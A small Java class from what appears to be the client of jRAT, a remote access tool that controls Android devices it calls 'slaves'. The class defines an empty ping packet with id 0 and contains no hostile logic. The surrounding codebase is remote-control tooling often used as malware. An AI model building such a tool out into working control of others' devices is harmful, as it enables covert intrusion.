package se.jrat.client.packets.android.outgoing;

import java.io.DataOutputStream;

import se.jrat.client.android.AndroidSlave;

public class AndroidPacket0Ping extends AbstractOutgoingAndroidPacket {

	@Override
	public void write(AndroidSlave slave, DataOutputStream dos) throws Exception {
		
	}

	@Override
	public byte getPacketId() {
		return 0;
	}

}
